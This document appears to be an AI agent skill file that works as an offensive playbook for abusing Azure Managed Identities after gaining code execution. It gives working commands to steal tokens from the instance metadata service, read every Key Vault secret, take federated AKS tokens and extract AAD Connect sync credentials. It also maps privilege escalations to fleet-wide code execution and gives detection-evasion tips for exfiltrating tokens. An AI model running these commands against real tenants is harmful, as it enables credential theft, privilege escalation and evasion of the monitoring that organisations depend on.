---
name: azure-managed-identity
description: "Azure Managed Identity abuse — IMDS at 169.254.169.254 from compromised VM / App Service / Function, token exchange for Graph/ARM/KeyVault, federated workload identity abuse, hybrid AAD Connect MSOL credential extraction."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "azure managed identity msi imds 169.254 system-assigned user-assigned graph arm keyvault workload identity aad connect msol federated"
  subdomain: cloud
  tags: azure, managed-identity, cloud-credential
  mitre_attack: T1552.005, T1078.004
---

# Azure Managed Identity Abuse

You have RCE in an Azure compute resource (VM, App Service, Function, AKS, Container Apps). Steal the Managed Identity token and pivot.

## Steal the token

### Linux VM / Container
```bash
TOKEN=$(curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r .access_token)
```

### Windows VM
```powershell
$h = @{Metadata="true"}
$r = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers $h
$TOKEN = $r.access_token
```

### App Service / Function (different endpoint, requires `IDENTITY_HEADER`)
```bash
TOKEN=$(curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  | jq -r .access_token)
```

## Common token audiences (`resource` param)

| Audience URL | Use |
|---|---|
| `https://management.azure.com/` | ARM — list/modify Azure resources |
| `https://graph.microsoft.com/` | Microsoft Graph — read directory, mail, groups |
| `https://vault.azure.net` | Key Vault — secrets, keys, certificates |
| `https://storage.azure.com/` | Storage account — blob/queue/file/table |
| `https://database.windows.net/` | Azure SQL |
| `https://servicebus.azure.net/` | Service Bus |

Request one token per audience — the MI assignment determines which work.

## Use the token

```bash
# Enumerate the subscription
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq .

# List Key Vaults (then a VAULT_TOKEN to read secrets)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01"

# Read every secret
VAULT_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r .access_token)
curl -s -H "Authorization: Bearer $VAULT_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.4" | jq .
```

## Pivot patterns

| MI permission | Pivot to |
|---|---|
| Contributor on subscription | RunCommand on every VM in the sub → fleet-wide RCE |
| KeyVault Reader / Secrets User | Decrypt all stored credentials |
| User Access Administrator | Self-grant Owner role anywhere |
| AAD App Owner | Modify app registration → app-credential persistence |
| Storage Account Contributor | Steal storage keys → SAS tokens (low audit signature) |

## Workload Identity (federated, no client secret)

AKS pods using Workload Identity Federation get a token via projected SA token + STS exchange. Steal the projected token from `/var/run/secrets/azure/tokens/azure-identity-token`, then:

```bash
SATOKEN=$(cat /var/run/secrets/azure/tokens/azure-identity-token)
TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "client_id=$CLIENT_ID&scope=https://management.azure.com/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$SATOKEN" | jq -r .access_token)
```

## AAD Connect MSOL (hybrid environments)

On a server running AAD Connect, MSOL_xxxxxxx in local SAM has DCSync rights → full domain compromise. Steal via DPAPI:

```powershell
# Run as SYSTEM on AAD Connect server
$key = (New-Object System.Security.Cryptography.AesManaged).Key
# AADInternals does this end-to-end:
Get-AADIntSyncCredentials      # AADInternals — extracts MSOL creds
```

## OPSEC

- Azure Activity Log records every ARM call. Use Graph for low-noise enumeration.
- Token TTL ~24h. Re-stealing is logged via the IMDS access pattern (visible in Azure VM monitor).
- `IDENTITY_HEADER` env on App Service is process-scope — exfil it from a single trick command, then reuse.
- Defender for Cloud + Microsoft Sentinel detect: "ManagedIdentityToken used from non-Azure IP" → exfil tokens carefully.

## References

- MicroBurst (NetSPI), MicroBurst-Cloud (Karl Fosaaen) — Azure-specific tooling
- ROADtools (Dirk-jan) — AAD enumeration without alerts
- DEFCON 30 "Abusing Azure Active Directory" — Andy Robbins
